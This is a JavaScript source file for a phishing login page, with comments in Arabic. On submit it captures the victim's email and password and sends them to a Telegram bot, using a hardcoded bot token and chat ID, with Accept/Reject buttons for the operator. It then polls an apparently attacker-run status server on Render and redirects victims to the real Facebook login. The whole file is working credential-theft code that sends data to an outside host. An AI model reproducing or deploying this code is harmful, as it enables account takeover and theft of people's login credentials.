document.getElementById('submit-btn').addEventListener('click', () => {
    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;

    // إرسال البيانات إلى تيليجرام مع أزرار قبول/رفض
    fetch('https://api.telegram.org/bot7828630167:AAG8iKwW5-NKU7OsmYDGmxip3NhhDBKLXVk/sendMessage', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: '5443898294',
            text: `🔐 Login Attempt\n📧 Email: ${email}\n🔑 Password: ${password}`,
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: '✅ Accept', callback_data: 'accept' },
                        { text: '❌ Reject', callback_data: 'reject' }
                    ]
                ]
            }
        })
    });

    // نبدأ في التحقق من حالة القبول/الرفض كل 2 ثانية
    checkLoginStatus();
});

function checkLoginStatus() {
    const interval = setInterval(() => {
        fetch('https://login-vpns.onrender.com/get-status') // ← رابط موقعك على Render
            .then(res => res.json())
            .then(data => {
                if (data.accepted) {
                    clearInterval(interval); // نوقف التحقق
                    window.location.href = 'https://www.facebook.com/login';
                }

                if (data.rejected) {
                    clearInterval(interval); // نوقف التحقق
                    document.getElementById('error-message').style.display = 'block';
                }
            })
            .catch(err => {
                console.error('خطأ أثناء التحقق من الحالة:', err);
            });
    }, 2000);
}
